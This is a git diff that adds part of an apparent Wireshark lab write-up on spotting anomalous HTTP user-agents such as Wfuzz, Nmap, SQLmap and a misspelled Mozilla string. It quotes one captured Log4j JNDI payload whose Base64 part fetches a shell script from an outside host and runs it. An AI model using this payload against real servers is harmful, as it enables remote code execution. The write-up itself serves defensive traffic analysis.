@@ -506,6 +506,39 @@ The client attempted to set full read, write, and execute permissions for the ow
 ## Part 6 - Cleartext Protocol Analysis: HTTP
 
 ### Question 1 - Investigate the user agents. What is the number of anomalous  "user-agent" types?
+First, a quick description on what a user-agent is: A user-agent is a string sent in HTTP request headers that identifies multiple things like the client software, operating system, and device type making the request. Think of it as a virtual ID for the client. User-agents can be helpful for security analysis because sometimes adversaries produce anomalous user-agents. The user-agent shouldn't solely be relied on though as an indicator of attack (IOA). Instead, it should serve as one piece of evidence in a broader investigation.
+
+In Wireshark, we can return all packets that have an user-agent with the following filter: `http.user_agent`. This question is asking for "anomalous" user-agents. Luckily, this packet capture is only 54 packets large, so looking through it won't prove too difficult. In a real scenario, You wouldn't want to use Wireshark to detect and find these types of IOAs. You would start with a detection or alert, from something like a SIEM, then pivot to Wireshark for deeper analysis since Wireshark is not a detection tool.
+
+Now what even is considered "anomalous" for user-agents? Put simply, it means a user-agent that is considered unusual or suspicious compared with what you would normally expect in HTTP traffic. This is a bit of a broad explanation, since there are **many** variations of user-agents, but they follow a somewhat similar pattern. E.g.,:
+```
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/[Version] Safari/537.36
+```
+This is an extremely common user-agent. It's essentially saying that the client request came from Chrome on Windows. So, a good place to start looking is for user-agents that stray outside of that pattern. I would suggest adding the user-agent field as a column in Wireshark for easier viewing. Click on one of the returned packets, expand the **Hypertext Transfer Protocol** tree, right-click on the **User-agent** field, then select **Apply as column**.
+
+<img width="918" height="828" alt="image" src="https://github.com/user-attachments/assets/aba511ee-6bbd-4e56-aeb8-b0ede55571d8" />
+
+Immediately, we can start to see some strange user-agent strings.
+
+<img width="932" height="233" alt="image" src="https://github.com/user-attachments/assets/c924bb51-0b47-4b85-9a63-322463b64b49" />
+
+This is saying that the request came from an application called **Wfuzz**, which is a web application fuzzer that you run from the command line for pen testing websites. This is pretty obvious, and most sophisticated threat actors will try and manipulate the user-agent so it looks "normal". We can actually see that there is another anomalous one that contains the string "Nmap" just above it. We all know what that is
+
+<img width="418" height="113" alt="image" src="https://github.com/user-attachments/assets/a1a27fca-93bc-49b3-9849-d79151f19e3f" />
+
+Finding some of these anomalies may require a basic understanding of what pentesting tools are out there. Here's another one that calls out **SQLmap**, which is another pentesting tool that tries to identify SQL injection opportunities.
+
+<img width="385" height="81" alt="image" src="https://github.com/user-attachments/assets/bea4316a-33da-4ca2-9a35-55b8f780cb0e" />
+
+You'll notice other user-agents that, while they don't exactly match the pattern above, are also legitimate. Nothing suspicious in the name. E.g., `Microsoft-WNS/10.0`. The next _very_ obvious one is the Log4j-related one (I'll explain Log4j later).
+```
+${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+```
+This gives us four in total. The only problem with this is that it's not the answer. I had to go back and take a much closer look at each user-agent to try and find which ones were anomalous. This next one took a while, there's a typo in "Mozilla".
+
+<img width="407" height="173" alt="image" src="https://github.com/user-attachments/assets/9110f156-d140-4e3a-8520-53bea9fee2b3" />
+
+The adversary tried to be sneaky and make this look like a natural user-agent, but Grammarly wasn't installed on their system.
 
 ### Question 2 - What is the packet number with a subtle spelling difference in the user agent field?
 
